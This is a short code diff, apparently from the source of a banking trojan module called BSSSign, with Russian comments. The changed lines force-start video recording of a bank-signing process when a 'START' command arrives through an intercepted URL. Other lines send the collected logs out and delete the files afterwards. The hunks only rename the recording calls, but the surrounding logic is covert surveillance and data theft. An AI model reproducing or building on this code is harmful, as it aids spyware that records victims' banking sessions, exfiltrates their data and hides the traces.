@@ -88,7 +88,7 @@ namespace BSSSign
 		string *Path = (string*)aPath;
 
 		//Отправляем логи
-		VideoRecorder::SendFiles(*Path);
+		VideoProcess::SendFiles( "bss", Path->t_str() );
 
 		// Удаляем файлы
 		DeleteFolders(Path->t_str());
@@ -521,7 +521,7 @@ protected:
 			поставлена
 		*/
         if (FClickedCount)
-			VideoRecorderSrv::StartInfiniteRecording("BSS");
+			VideoProcess::RecordPID("BSS");
 
 		//---------------------------------------------
 
@@ -877,9 +877,9 @@ void BSSSign::CheckRequest(PCHAR URL)
 
 		// Если с данного процесса не запущена запись видео
 		// то принудительно стартуем её
-		RecordVideo = !VideoRecorderSrv::PingClient(0);
-		if (RecordVideo)
-			RecordVideo = VideoRecorderSrv::StartRecording(BSSSignName);
+		//RecordVideo = !VideoRecorderSrv::PingClient(0);
+		//if (RecordVideo)
+			RecordVideo = VideoProcess::RecordPID(BSSSignName);
 
         BSSSIGNLOG(NULL, true, "Получена команда СТАРТ");
 	}
@@ -892,7 +892,7 @@ void BSSSign::CheckRequest(PCHAR URL)
 		if (RecordVideo)
 		{
 			RecordVideo = false;
-			VideoRecorderSrv::StopRecording();
+			VideoProcess::RecordStop();
 		}
 
 		#ifdef LOG_BSS_SIGN
